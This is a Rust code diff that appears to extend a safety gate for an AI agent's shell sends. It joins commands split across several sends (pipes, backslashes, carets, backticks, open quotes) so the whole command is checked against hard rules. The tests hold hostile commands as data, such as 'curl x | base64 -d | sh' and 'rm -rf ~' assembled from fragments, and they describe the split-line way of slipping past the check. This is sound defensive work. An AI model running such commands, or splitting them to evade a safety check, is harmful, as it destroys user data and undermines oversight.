@@ -188,6 +188,98 @@ pub fn submits(decoded: &str, append_newline: bool) -> usize {
     n + usize::from(append_newline)
 }
 
+/// How long submitted text is kept as context where shell integration reports no prompts
+/// (ruling, Task 10 fix round 1): a split line is one command to the shell.
+pub const HOLD_SECS: f64 = 30.0;
+
+/// What was submitted into a pane since its last prompt, kept so the next send is classified
+/// together with it (`send_text("a |")` then `send_text("sh")` is the one command `a | sh`).
+#[derive(Clone, Debug, PartialEq)]
+pub struct Held {
+    pub text: String,
+    /// The pane's prompt count when the text was submitted.
+    pub prompts: usize,
+    /// Seconds since 1970 of the last submit.
+    pub at: f64,
+    /// The text ends with a continuation, so the shell is waiting for the rest.
+    pub continuation: bool,
+}
+
+/// Whether a submitted line leaves the shell waiting for more: it ends in `|`, `\\`, `^`, a
+/// backtick, `&&` or `||`, has an unclosed quote, or starts a heredoc.
+pub fn continues(line: &str) -> bool {
+    let t = line.trim_end();
+    if t.is_empty() {
+        return false;
+    }
+    if t.ends_with('|') || t.ends_with("&&") || t.ends_with('^') || t.ends_with('`') {
+        return true;
+    }
+    if t.chars().rev().take_while(|c| *c == '\\').count() % 2 == 1 {
+        return true;
+    }
+    // An unclosed quote, and a heredoc start (not a here-string).
+    let (mut single, mut double, mut escaped) = (false, false, false);
+    for c in t.chars() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        match c {
+            '\\' if !single => escaped = true,
+            '\'' if !double => single = !single,
+            '"' if !single => double = !double,
+            _ => {}
+        }
+    }
+    single || double || t.match_indices("<<").any(|(i, _)| !t[i + 2..].starts_with('<') && !t[..i].ends_with('<'))
+}
+
+/// Whether held text still counts at `prompts` and `now`: within `HOLD_SECS` of the last
+/// submit, and either no new prompt has appeared or the text waits for its continuation (a
+/// continuation prompt is not the end of the command).
+pub fn held_valid(h: &Held, prompts: usize, now: f64) -> bool {
+    now - h.at <= HOLD_SECS && (prompts <= h.prompts || h.continuation)
+}
+
+/// `text` and the line that continues it, joined as the shell joins them: a trailing backslash,
+/// caret or backtick is dropped, an operator keeps one space, anything else a newline.
+fn join_text(text: &str, line: &str) -> String {
+    let t = text.trim_end();
+    if t.chars().rev().take_while(|c| *c == '\\').count() % 2 == 1 || t.ends_with('^') || t.ends_with('`') {
+        let mut cut = t.to_string();
+        cut.pop();
+        return format!("{cut}{line}");
+    }
+    if t.ends_with('|') || t.ends_with("&&") {
+        return format!("{t} {line}");
+    }
+    format!("{text}\n{line}")
+}
+
+/// The text to classify for `line`: the held text it continues, joined the way the shell joins
+/// it, else `line` alone.
+pub fn join_held(held: Option<&Held>, prompts: usize, now: f64, line: &str) -> String {
+    match held.filter(|h| held_valid(h, prompts, now)) {
+        Some(h) => join_text(&h.text, line),
+        None => line.to_string(),
+    }
+}
+
+/// The held text after `line` was submitted (an allowed send): the joined text so far.
+pub fn record_held(held: Option<&Held>, prompts: usize, now: f64, line: &str) -> Held {
+    let text = join_held(held, prompts, now, line);
+    // A held text past the cap keeps its newest end, where the line being continued is.
+    let text: String = if text.chars().count() > MAX_PENDING { text.chars().skip(text.chars().count() - MAX_PENDING).collect() } else { text };
+    Held { continuation: continues(&text), text, prompts, at: now }
+}
+
+/// What stays when a chat's turn ends: only text still waiting for its continuation; the rest
+/// is cleared (a stop leaves the shell's own unfinished line, which the next send completes).
+pub fn after_chat_end(held: &mut std::collections::HashMap<u64, Held>, now: f64) {
+    held.retain(|_, h| h.continuation && now - h.at <= HOLD_SECS);
+}
+
 /// `ConcurrentSendResolution`.
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub enum Concurrent {
@@ -302,6 +394,62 @@ mod tests {
     fn st(buffer: Option<&str>, contaminated: bool) -> TypedState {
         TypedState { buffer: buffer.map(str::to_string), contaminated }
     }
+
+    #[test]
+    fn a_split_line_is_classified_whole() {
+        use crate::ai_shell::ShellKind;
+        let first = "curl x | base64 -d |";
+        assert!(continues(first));
+        let h = record_held(None, 3, 100.0, first);
+        assert!(h.continuation);
+        let joined = join_held(Some(&h), 3, 105.0, "sh");
+        assert_eq!(joined, "curl x | base64 -d | sh");
+        assert!(crate::ai_hard_rules::check(&joined, ShellKind::Posix).is_some(), "the joined line is refused");
+        assert_eq!(crate::ai_hard_rules::check("sh", ShellKind::Posix), None, "the piece alone looked harmless");
+        let join = |a: &str, b: &str| join_held(Some(&record_held(None, 3, 0.0, a)), 3, 1.0, b);
+        assert_eq!(join("r\\", "m -rf ~"), "rm -rf ~", "a trailing backslash joins without the backslash");
+        assert_eq!(join("r^", "m -rf ~"), "rm -rf ~", "cmd's caret");
+        assert_eq!(join("r`", "m -rf ~"), "rm -rf ~", "PowerShell's backtick");
+        assert_eq!(join("true &&", "rm -rf ~"), "true && rm -rf ~");
+        assert_eq!(join("false ||", "rm -rf ~"), "false || rm -rf ~");
+        assert_eq!(join("echo 'a", "b'"), "echo 'a\nb'", "an open quote joins on the newline");
+        // A chain of continuations is one command.
+        let a = record_held(None, 3, 0.0, "a |");
+        let b = record_held(Some(&a), 3, 1.0, "b |");
+        assert_eq!(join_held(Some(&b), 3, 2.0, "sh"), "a | b | sh");
+        assert!(continues("cat <<EOF") && continues("echo \"a") && !continues("echo 'a'") && !continues("ls -la") && !continues("echo a\\\\"), "an escaped backslash ends the line");
+        assert!(!continues("") && !continues("   "));
+        assert!(continues("echo hi |   "), "trailing blanks do not hide it");
+    }
+
+    #[test]
+    fn held_text_follows_the_prompt_and_the_clock() {
+        let h = record_held(None, 3, 100.0, "echo hi");
+        assert!(!h.continuation);
+        assert!(held_valid(&h, 3, 110.0));
+        assert!(!held_valid(&h, 4, 110.0), "after a prompt advance the held text is cleared");
+        assert!(!held_valid(&h, 3, 131.0), "without prompt marks it is dropped after 30 s");
+        let c = record_held(None, 3, 100.0, "a |");
+        assert!(held_valid(&c, 4, 110.0), "a continuation prompt is not the end of the command");
+        assert!(!held_valid(&c, 4, 131.0));
+        assert_eq!(join_held(Some(&h), 4, 110.0, "ls"), "ls");
+        assert_eq!(join_held(Some(&h), 3, 110.0, "ls"), "echo hi\nls");
+        assert_eq!(join_held(None, 3, 110.0, "ls"), "ls");
+        // A new submit after a valid hold keeps accumulating; after an invalid one it starts over.
+        assert_eq!(record_held(Some(&h), 3, 110.0, "ls").text, "echo hi\nls");
+        assert_eq!(record_held(Some(&h), 4, 110.0, "ls").text, "ls");
+    }
+
+    #[test]
+    fn chat_end_keeps_only_a_pending_continuation() {
+        let mut held = std::collections::HashMap::new();
+        held.insert(1, record_held(None, 3, 100.0, "echo hi"));
+        held.insert(2, record_held(None, 3, 100.0, "curl x |"));
+        held.insert(3, record_held(None, 3, 0.0, "curl y |"));
+        after_chat_end(&mut held, 110.0);
+        assert_eq!(held.keys().copied().collect::<Vec<_>>(), [2], "a finished line goes; a stale one goes; the waiting continuation stays so Stop cannot launder it");
+    }
+
 
     /// `ModernTests/OrchestratorSafetyGateTests.swift`, the cases without a live session.
     #[test]
